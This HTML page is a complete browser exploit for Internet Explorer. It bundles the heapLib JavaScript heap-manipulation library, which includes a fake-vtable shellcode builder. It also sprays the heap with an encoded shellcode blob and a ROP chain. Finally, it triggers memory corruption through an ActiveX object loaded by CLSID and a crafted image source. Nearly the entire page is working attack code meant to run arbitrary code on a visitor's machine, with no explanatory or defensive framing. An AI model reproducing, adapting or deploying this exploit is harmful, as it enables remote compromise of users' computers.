<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0019)http://192.168.1.5/ -->
<HTML><HEAD>
<META content="text/html; charset=utf-8" http-equiv=Content-Type>
<SCRIPT>
//
//   JavaScript Heap Exploitation library
//   by Alexander Sotirov <asotirov@determina.com>
//  
//   Version 0.3
//
// Copyright (c) 2007, Alexander Sotirov
// All rights reserved.
// 
// The HeapLib library is licensed under a BSD license, the text of which follows:
// 
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions
// are met:
// 
// 1. Redistributions of source code must retain the above copyright
//    notice, this list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
// 3. Neither the name of Alexander Sotirov nor the name of Determina Inc.
//    may be used to endorse or promote products derived from this software
//    without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.
//
 
//
// heapLib namespace
//

function heapLib() {
}


//
// heapLib class
//

// heapLib.ie constructor
//
// Creates a new heapLib API object for Internet Explorer. The maxAlloc
// argument sets the maximum block size that can be allocated using the alloc()
// function.
//
// Arguments:
//    maxAlloc - maximum allocation size in bytes (defaults to 65535)
//    heapBase - base of the default process heap (defaults to 0x150000)
//

heapLib.ie = function(maxAlloc, heapBase) {

    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
    this.heapBase = (heapBase ? heapBase : 0x150000);

    // Allocate a padding string that uses maxAlloc bytes
    this.paddingStr = "AAAA";

    while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
        this.paddingStr += this.paddingStr;
    }
    
    // Create an array for storing references to allocated memory
    this.mem = new Array();

    // Call flushOleaut32() once to allocate the maximum size blocks
    this.flushOleaut32();
}


//
// Outputs a debugging message in WinDbg. The msg argument must be a string
// literal. Using string concatenation to build the message will result in heap
// allocations.
//
// Arguments:
//    msg - string to output
//

heapLib.ie.prototype.debug = function(msg) {
    void(Math.atan2(0xbabe, msg));
}


//
// Enables or disables logging of heap operations in WinDbg.
//
// Arguments:
//    enable - a boolean value, set to true to enable heap logging
//

heapLib.ie.prototype.debugHeap = function(enable) {

    if (enable == true)
        void(Math.atan(0xbabe));
    else
        void(Math.asin(0xbabe));
}


//
// Triggers a breakpoint in the debugger.
//

heapLib.ie.prototype.debugBreak = function(msg) {
    void(Math.acos(0xbabe));
}


//
// Returns a string of a specified length, up to the maximum allocation size
// set in the heapLib.ie constructor. The string contains "A" characters.
//
// Arguments:
//    len - length in characters
//

heapLib.ie.prototype.padding = function(len) {
    if (len > this.paddingStr.length)
        throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";

    return this.paddingStr.substr(0, len);
}


//
// Returns a number rounded up to a specified value.
//
// Arguments:
//    num   - integer to round
//    round - value to round to
//

heapLib.ie.prototype.round = function(num, round) {
    if (round == 0)
        throw "Round argument cannot be 0";

    return parseInt((num + (round-1)) / round) * round;
}


//
// Converts an integer to a hex string. This function uses the heap.
//
// Arguments:
//    num   - integer to convert
//    width - pad the output with zeros to a specified width (optional)
//

heapLib.ie.prototype.hex = function(num, width)
{
    var digits = "0123456789ABCDEF";

    var hex = digits.substr(num & 0xF, 1);

    while (num > 0xF) {
        num = num >>> 4;
        hex = digits.substr(num & 0xF, 1) + hex;
    }

    var width = (width ? width : 0);

    while (hex.length < width)
        hex = "0" + hex;

    return hex;
}


//
// Convert a 32-bit address to a 4-byte string with the same representation in
// memory. This function uses the heap.
//
// Arguments:
//    addr - integer representation of the address
//

heapLib.ie.prototype.addr = function(addr) {
    return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}


//
// Allocates a block of a specified size with the OLEAUT32 alloc function.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    // Create an array for this tag if doesn't already exist
    if (this.mem[tag] === undefined)
        this.mem[tag] = new Array();

    if (typeof arg == "string" || arg instanceof String) {
        // Allocate a new block with strdup of the string argument
        this.mem[tag].push(arg.substr(0, arg.length));
    }
    else {
        // Allocate the block
        this.mem[tag].push(this.padding((arg-6)/2));
    }
}


//
// Frees all memory blocks marked with a specific tag with the OLEAUT32 memory
// allocator.
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.freeOleaut32 = function(tag) {

    delete this.mem[tag];
    
    // Run the garbage collector
    CollectGarbage();
}


//
// The JScript interpreter uses the OLEAUT32 memory allocator for all string
// allocations. This allocator stores freed blocks in a cache and reuses them
// for later allocations. The cache consists of 4 bins, each storing up to 6
// blocks. Each bin holds blocks of a certain size range:
//
//    0 - 32
//    33 - 64
//    65 - 256
//    257 - 32768
//
// When a block is freed by the OLEAUT32 free function, it is stored in one of
// the bins. If the bin is full, the smallest block in the bin is freed with
// RtlFreeHeap() and is replaced with the new block. Chunks larger than 32768
// bytes are not cached and are freed directly.
//
// To flush the cache, we need to free 6 blocks of the maximum size for each
// bin. The maximum size blocks will push out all smaller blocks from the
// cache. Then we allocate the maximum size blocks again, leaving the cache
// empty.
//
// You need to call this function once to allocate the maximum size blocks
// before you can use it to flush the cache.
//

heapLib.ie.prototype.flushOleaut32 = function() {

    this.debug("Flushing the OLEAUT32 cache");

    // Free the maximum size blocks and push out all smaller blocks

    this.freeOleaut32("oleaut32");
    
    // Allocate the maximum sized blocks again, emptying the cache

    for (var i = 0; i < 6; i++) {
        this.allocOleaut32(32, "oleaut32");
        this.allocOleaut32(64, "oleaut32");
        this.allocOleaut32(256, "oleaut32");
        this.allocOleaut32(32768, "oleaut32");
    }
}


//
// Allocates a block of a specified size with the system memory allocator. A
// call to this function is equivalent to a call to HeapAlloc(). If the first
// argument is a number, it specifies the size of the new block, which is
// filled with "A" characters. If the argument is a string, its data is copied
// into a new block of size arg.length * 2 + 6. In both cases the size of the
// new block must be a multiple of 16 and not equal to 32, 64, 256 or 32768.
//
// Arguments:
//    arg - size of the memory block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.alloc = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if (size == 32 || size == 64 || size == 256 || size == 32768)
        throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

    // Allocate the block with the OLEAUT32 allocator
    this.allocOleaut32(arg, tag);
}


//
// Frees all memory blocks marked with a specific tag with the system memory
// allocator. A call to this function is equivalent to a call to HeapFree().
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.free = function(tag) {

    // Free the blocks with the OLEAUT32 free function
    this.freeOleaut32(tag);

    // Flush the OLEAUT32 cache
    this.flushOleaut32();
}


//
// Runs the garbage collector and flushes the OLEAUT32 cache. Call this
// function before before using alloc() and free().
//

heapLib.ie.prototype.gc = function() {

    this.debug("Running the garbage collector");
    CollectGarbage();

    this.flushOleaut32();
}


//
// Adds blocks of the specified size to the free list and makes sure they are
// not coalesced. The heap must be defragmented before calling this function.
// If the size of the memory blocks is less than 1024, you have to make sure
// that the lookaside is full.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many free blocks to add to the list (defaults to 1)
//

heapLib.ie.prototype.freeList = function(arg, count) {

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++) {
        this.alloc(arg);
        this.alloc(arg, "freeList");
    }
    this.alloc(arg);

    this.free("freeList");
}


//
// Add blocks of the specified size to the lookaside. The lookaside must be
// empty before calling this function.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many blocks to add to the lookaside (defaults to 1)
//

heapLib.ie.prototype.lookaside = function(arg, count) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++)
        this.alloc(arg, "lookaside");

    this.free("lookaside");
}


//
// Return the address of the head of the lookaside linked list for blocks of a
// specified size. Uses the heapBase parameter from the heapLib.ie constructor.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//

heapLib.ie.prototype.lookasideAddr = function(arg)
{
    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    // The lookahead array starts at heapBase + 0x688. It contains a 48 byte
    // structure for each block size + header size in 8 byte increments.

    return this.heapBase + 0x688 + ((size+8)/8)*48;
}


//
// Returns a fake vtable that contains shellcode. The caller should free the
// vtable to the lookaside and use the address of the lookaside head as an
// object pointer. When the vtable is used, the address of the object must be
// in eax and the pointer to the vtable must be in ecx. Any virtual function
// call through the vtable from ecx+8 to ecx+0x80 will result in shellcode
// execution. This function uses the heap.
//
// Arguments:
//    shellcode - shellcode string
//    jmpecx    - address of a jmp ecx or equivalent instruction
//    size      - size of the vtable to generate (defaults to 1008 bytes)
//

heapLib.ie.prototype.vtable = function(shellcode, jmpecx, size) {

    var size = (size ? size : 1008);

    // Make sure the size is valid
    if ((size & 0xf) != 0)
        throw "Vtable size " + size + " must be a multiple of 16";

    if (shellcode.length*2 > size-138)
        throw("Maximum shellcode length is " + (size-138) + " bytes");

    // Build the fake vtable that will go on the lookaside list
    //
    // lookaside ptr  jmp +124  addr of jmp ecx  sub [eax], al*2  shellcode       null
    // 4 bytes        4 bytes   124 bytes        4 bytes          size-138 bytes  2 bytes

    var vtable = unescape("%u9090%u7ceb")   // nop, nop, jmp + 124

    for (var i = 0; i < 124/4; i++)
        vtable += this.addr(jmpecx);

    // If the vtable is the only entry on the lookaside, the first 4 bytes will
    // be 00 00 00 00, which disassembles as two add [eax], al instructions.
    // The jmp ecx trampoline will jump back to the beginning of the vtable and
    // execute the add [eax], al instructions. We need to use two sub [eax], al
    // instructions to fix the heap.

    vtable += unescape("%u0028%u0028") +    // two sub [eax], al instructions
              shellcode + heap.padding((size-138)/2 - shellcode.length);

    return vtable;
}


function randomblock(blocksize)
{
	var theblock = "";
	for (var i = 0; i < blocksize; i++)
	{
		theblock += Math.floor(Math.random()*90)+10;
	}
	return theblock;
}

function tounescape(block)
{
	var blocklen = block.length;
	var unescapestr = "";
	for (var i = 0; i < blocklen-1; i=i+4)
	{
		unescapestr += "%u" + block.substring(i,i+4);
	}
	return unescapestr;
}

var heap_obj = new heapLib.ie(0x10000);

var rop = unescape("%u0c0c%u0c0c%u7f98%u7c34%u6541%u7c37%u8b05%u7c34%u7f98%u7c34%u7f98%u7c34%u7f98%u7c34%u7f98%u7c34%u653d%u7c37%u1000%u0000%u7f98%u7c34%u15a2%u7c34%uffff%uffff%u6402%u7c37%u5255%u7c34%u2174%u7c35%u4f87%u7c34%u0040%u0000%ud201%u7c34%ub001%u7c38%u7f97%u7c34%ua151%u7c37%u8c81%u7c37%u5c30%u7c34");
var code = unescape("%u9641%u4a74%u1367%u86f5%u8dfc%u05b3%u0c92%u7db9%u7b49%ud51b%u9f93%u993f%ub5b7%uf719%u43e0%uf987%u4779%u487c%u7725%u9046%u343d%u1373%u75d4%u012c%ue3d2%u8c35%u9bd6%ud133%u24eb%ua81d%u324b%u3ce2%ub8bf%u024f%u70f8%ub142%u2466%u734b%uff21%uebc0%u1174%u4fd6%u1c2d%ue120%u7e7c%u9134%u85b3%ue2f6%u6672%u7698%u7d70%u0477%ub227%u2c40%u157b%u1db8%u8d92%u3d9f%ufc0a%u7a25%ube0d%ud410%uf528%ub53c%u0578%u3579%u4299%ub0bf%ub996%u370c%u4e14%ua9b4%u46a8%ud50b%u1243%uc7ff%uc1c6%u47f9%ufd83%ue309%u494a%u4171%u9bb6%u7597%ud069%u3fe0%u93b7%u67ba%u487f%u1a90%u2fe1%u81bb%u71eb%uf838%ua9b1%u7d8d%ue030%ud52b%u2c7b%u2d72%u47b9%u277f%ue23b%u8824%ub6d6%u8690%u67f5%ubb14%u237a%u79fd%u2505%u1d1c%ubf42%u4e74%ub341%ub0be%u78b1%uf808%u7696%u9366%u7e77%ub43c%u433f%u049b%u460c%u703d%u3740%u7397%ue329%u494b%u4a34%ub599%u7c75%uf922%u3a15%u91d4%u9f98%ubab2%ub892%u4fa8%u802f%u35fc%u3176%u7de1%u707f%ub748%ue289%ube0d%uf984%u7174%u3972%u3cf8%u7535%u034a%u77d4%u9943%u9091%u3f48%ueb2a%u9637%u9bba%u933d%u2773%ubb4f%u988d%u157a%ub566%ufd18%u6bb2%u4ed5%u4bb1%u3442%ua8b4%ubf1d%ub040%u092d%u12e0%u41fc%ub3b9%u0414%u2449%u2cb6%ub8b7%u6778%u0d7e%u92a9%u2f7c%ue318%u470c%u059f%u1c7b%u0346%u25f5%u7997%u787a%ud61b%u9698%ud387%ue1d1%u3774%ud613%u777e%u4767%u3c2c%ub62f%u8da8%u1075%uc1d2%u48e2%ubf49%u1a73%uebf6%ub934%uf984%u9fb3%ud588%u4a79%ubbb7%u3b04%u4ee3%u7f90%u9b25%u4b97%u2446%u357d%u4243%u1d7c%ub499%u4093%ud023%u72fc%u700d%ube15%ub092%uba91%u05b2%u3d71%ub12d%ub83f%uf832%u761c%ufd2b%u4f41%ue089%ud430%u66b5%u2aa9%u0cf5%u7d7b%u8527%u14e0%u8db5%ue111%u7b75%ub435%u76bb%u667c%u91ba%ub025%u379f%ub33d%u9693%ub847%ua84e%u291d%u78f9%u9b67%ube34%u8c4f%u70d6%u2779%u7248%u777a%u904a%ufd80%u057e%u192d%u73eb%ua914%u3c74%u4b71%u0d1c%u982c%u0ab2%ub7f5%u8340%u0ce2%u7fb6%uf831%ue381%ue102%u9943%u017c%u72e3%u4271%u7697%ud569%u7fbf%u752f%ub104%u7bb9%u7015%u7d49%u7e46%ue008%ufe0b%ufcc0%u3977%u92d4%u417a%u3f74%u2479%u3a78%u9bf9%u6bbf%ue2f7%u7327%u860c%u20eb%u99f5%u1cb7%ubb37%u6742%ub2b4%u4f4b%ua94a%ub0b5%ua8b6%u3cb8%u4e41%u1490%uba92%ub340%u2d3f%ub946%u2404%ube48%ufc28%ub196%u9f1d%u3366%u49d4%u438d%u3534%ufd22%u38d6%u3dd5%u9197%u2c0d%u9325%u0515%u212f%u47f8%ubd98%ua339%u4447%uc1d9%u74d9%uf424%u2b5a%ub1c9%u3149%u146a%u6a03%u8314%ufcea%u56db%uacbb%u9992%u2d44%u10c4%u1ca1%u47d6%u0da1%u0ce6%ubde7%u418d%u351c%u4de3%ufe13%ua849%uff1a%u747c%uc3f0%u081f%u100b%u31ff%u65c4%u76fe%u8539%u2e52%u3435%u5b42%u850b%u8b63%ub507%uae1b%u42d8%ub191%ufa08%ufaae%u70b0%udae8%u55c1%u27eb%ud28b%udcdf%u330a%u1c2e%u7b3d%u23fc%u76f1%u64fd%u6936%u9e88%u1444%u648a%uc236%u791f%u8190%u5987%u4520%u2951%u222e%u7516%ub533%u0dfb%u3e4f%uc1fa%u04d9%uc5d8%udf82%u5f41%ub16f%ubf7e%u6ed7%ucbda%u7bfa%u965c%u4892%u2952%uc763%u5ae5%u4851%uf55d%u01d9%u027b%u381d%u9c3b%uc3e0%ub43b%u9726%uae6b%u988f%u2ee0%u4d2f%u7ea6%u3e9f%u2f06%uef5f%u25ee%ud050%u460e%u79ba%ubca4%u462d%ube90%u2ea8%uc0e2%u3ead%u266b%u2ebb%uf03d%ud654%u8a64%u17c5%uf6b3%u9cc6%u0637%u5488%u1432%u957d%u4609%uaa28%ueda4%u3ed5%ua442%ud682%u9148%u78e5%uf4b3%ub07d%ub721%ubde9%u37a5%uebea%u37af%u4b82%u6b8b%u93b7%u1806%u0664%u49a8%u81d8%u77c0%ue507%u874f%uf762%u5eac%u7d4b%ud4c4%ubdbf");
var nops_90 = unescape("%u8dd4%uf819");

while (nops_90.length < 0x80000) nops_90 += nops_90;

var offset_length = 1532;

for (var i=0; i < 0x1000; i++) {
	var padding = unescape(tounescape(randomblock(0x1000)));
	while (padding.length < 0x1000) padding+= padding;
	var junk_offset = padding.substring(0, offset_length - code.length);
	var single_sprayblock = code + junk_offset + rop + nops_90.substring(0, 0x800 - code.length - junk_offset.length - rop.length);
	while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;
	sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);
	heap_obj.alloc(sprayblock);
}


</SCRIPT>

<META name=GENERATOR content="MSHTML 9.00.8112.16447"></HEAD>
<BODY>
<OBJECT id=LYkW classid=clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4></OBJECT>
<SCRIPT>
var obj = document.getElementById('LYkW').object;
var src = unescape("%u0c08%u0c0c");
while (src.length < 0x1002) src += src;
src = "\\\\xxx" + src;
src = src.substr(0, 0x1000 - 10);
var pic = document.createElement("img");
pic.src = src;
pic.nameProp;
obj.definition(949);
</SCRIPT>
</BODY></HTML>
